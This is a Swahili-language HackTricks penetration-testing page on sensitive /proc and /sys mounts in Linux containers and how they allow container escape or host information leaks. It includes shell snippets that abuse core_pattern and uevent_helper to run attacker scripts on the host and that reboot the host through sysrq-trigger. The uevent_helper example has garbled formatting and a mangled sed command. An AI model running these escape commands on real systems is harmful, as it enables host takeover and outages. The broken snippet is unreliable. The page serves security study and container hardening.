# Sensitive Mounts

{{#include ../../../../banners/hacktricks-training.md}}

Ufunuo wa `/proc` na `/sys` bila kutengwa kwa namespace sahihi unaleta hatari kubwa za usalama, ikiwa ni pamoja na kuongezeka kwa uso wa shambulio na ufichuzi wa taarifa. Maktaba haya yana faili nyeti ambazo, ikiwa zimepangwa vibaya au kufikiwa na mtumiaji asiyeidhinishwa, zinaweza kusababisha kutoroka kwa kontena, mabadiliko ya mwenyeji, au kutoa taarifa zinazosaidia mashambulizi zaidi. Kwa mfano, kuunganisha vibaya `-v /proc:/host/proc` kunaweza kupita ulinzi wa AppArmor kutokana na asili yake ya msingi wa njia, na kuacha `/host/proc` bila ulinzi.

**Unaweza kupata maelezo zaidi ya kila hatari inayoweza kutokea katika** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## procfs Vulnerabilities

### `/proc/sys`

Maktaba hii inaruhusu ufikiaji wa kubadilisha vigezo vya kernel, kawaida kupitia `sysctl(2)`, na ina subdirectories kadhaa za wasiwasi:

#### **`/proc/sys/kernel/core_pattern`**

- Imeelezwa katika [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
- Inaruhusu kufafanua programu ya kutekeleza wakati wa uzalishaji wa core-file na bytes 128 za kwanza kama hoja. Hii inaweza kusababisha utekelezaji wa msimbo ikiwa faili inaanza na bomba `|`.
- **Mfano wa Upimaji na Ukatili**:

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Jaribu ufikiaji wa kuandika
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Weka mpangaji maalum
sleep 5 && ./crash & # Trigger handler
```

#### **`/proc/sys/kernel/modprobe`**

- Imeelezwa kwa undani katika [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Ina njia ya mpangaji wa moduli ya kernel, inayotumika kwa kupakia moduli za kernel.
- **Mfano wa Kuangalia Ufikiaji**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Angalia ufikiaji wa modprobe
```

#### **`/proc/sys/vm/panic_on_oom`**

- Imeelezwa katika [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Bendera ya kimataifa inayodhibiti ikiwa kernel inapaswa kujiweka katika hali ya panic au kuanzisha OOM killer wakati hali ya OOM inatokea.

#### **`/proc/sys/fs`**

- Kulingana na [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), ina chaguzi na taarifa kuhusu mfumo wa faili.
- Ufikiaji wa kuandika unaweza kuwezesha mashambulizi mbalimbali ya kukatiza huduma dhidi ya mwenyeji.

#### **`/proc/sys/fs/binfmt_misc`**

- Inaruhusu kujiandikisha kwa wakalimani wa muundo wa binary usio wa asili kulingana na nambari zao za uchawi.
- Inaweza kusababisha kupanda kwa haki au ufikiaji wa root shell ikiwa `/proc/sys/fs/binfmt_misc/register` inaweza kuandikwa.
- Ukatili na maelezo yanayohusiana:
- [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
- Mafunzo ya kina: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Wengine katika `/proc`

#### **`/proc/config.gz`**

- Inaweza kufichua usanidi wa kernel ikiwa `CONFIG_IKCONFIG_PROC` imewezeshwa.
- Inatumika kwa washambuliaji kubaini udhaifu katika kernel inayotumika.

#### **`/proc/sysrq-trigger`**

- Inaruhusu kuanzisha amri za Sysrq, ambayo inaweza kusababisha upya wa mfumo mara moja au hatua nyingine muhimu.
- **Mfano wa Kuanzisha Upya Mwenyeji**:

```bash
echo b > /proc/sysrq-trigger # Inarejesha mwenyeji
```

#### **`/proc/kmsg`**

- Inafichua ujumbe wa buffer ya ring ya kernel.
- Inaweza kusaidia katika ukatili wa kernel, uvujaji wa anwani, na kutoa taarifa nyeti za mfumo.

#### **`/proc/kallsyms`**

- Inataja alama za kernel zilizotolewa na anwani zao.
- Muhimu kwa maendeleo ya ukatili wa kernel, hasa kwa kushinda KASLR.
- Taarifa za anwani zinapunguzwa ikiwa `kptr_restrict` imewekwa kwa `1` au `2`.
- Maelezo katika [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

- Inafanya kazi na kifaa cha kumbukumbu ya kernel `/dev/mem`.
- Kihistoria ilikuwa na udhaifu wa mashambulizi ya kupanda kwa haki.
- Zaidi juu ya [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

- Inawakilisha kumbukumbu ya kimwili ya mfumo katika muundo wa ELF core.
- Kusoma kunaweza kufichua maudhui ya kumbukumbu ya mfumo wa mwenyeji na kontena nyingine.
- Ukubwa mkubwa wa faili unaweza kusababisha matatizo ya kusoma au kuanguka kwa programu.
- Matumizi ya kina katika [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

- Kiolesura mbadala kwa `/dev/kmem`, kinawakilisha kumbukumbu ya virtual ya kernel.
- Inaruhusu kusoma na kuandika, hivyo kubadilisha moja kwa moja kumbukumbu ya kernel.

#### **`/proc/mem`**

- Kiolesura mbadala kwa `/dev/mem`, kinawakilisha kumbukumbu ya kimwili.
- Inaruhusu kusoma na kuandika, kubadilisha kumbukumbu yote kunahitaji kutatua anwani za virtual hadi za kimwili.

#### **`/proc/sched_debug`**

- Inarudisha taarifa za kupanga mchakato, ikipita ulinzi wa namespace ya PID.
- Inafichua majina ya mchakato, IDs, na vitambulisho vya cgroup.

#### **`/proc/[pid]/mountinfo`**

- Inatoa taarifa kuhusu maeneo ya kuunganisha katika namespace ya kuunganisha ya mchakato.
- Inafichua eneo la `rootfs` ya kontena au picha.

### `/sys` Vulnerabilities

#### **`/sys/kernel/uevent_helper`**

- Inatumika kwa kushughulikia `uevents` za kifaa cha kernel.
- Kuandika kwenye `/sys/kernel/uevent_helper` kunaweza kutekeleza skripti zisizo na mipaka wakati wa kuanzishwa kwa `uevent`.
- **Mfano wa Ukatili**: %%%bash

#### Inaunda payload

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### Inapata njia ya mwenyeji kutoka kwa OverlayFS mount kwa kontena

host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)

#### Inapanga uevent_helper kwa mpangaji mbaya

echo "$host_path/evil-helper" > /sys/kernel/uevent_helper

#### Inasababisha uevent

echo change > /sys/class/mem/null/uevent

#### Inasoma matokeo

cat /output %%%

#### **`/sys/class/thermal`**

- Inadhibiti mipangilio ya joto, ambayo inaweza kusababisha mashambulizi ya DoS au uharibifu wa kimwili.

#### **`/sys/kernel/vmcoreinfo`**

- Inafichua anwani za kernel, ambayo inaweza kuhatarisha KASLR.

#### **`/sys/kernel/security`**

- Ina nyumba ya kiolesura cha `securityfs`, kinachoruhusu usanidi wa Moduli za Usalama za Linux kama AppArmor.
- Ufikiaji unaweza kuwezesha kontena kuzima mfumo wake wa MAC.

#### **`/sys/firmware/efi/vars` na `/sys/firmware/efi/efivars`**

- Inafichua violesura vya kuingiliana na mabadiliko ya EFI katika NVRAM.
- Usanidi mbaya au ukatili unaweza kusababisha kompyuta zisizoweza kuanzishwa au kompyuta za mwenyeji zisizoweza kuanzishwa.

#### **`/sys/kernel/debug`**

- `debugfs` inatoa kiolesura cha "hakuna sheria" kwa ufuatiliaji wa kernel.
- Historia ya masuala ya usalama kutokana na asili yake isiyo na mipaka.

### References

- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)

{{#include ../../../../banners/hacktricks-training.md}}
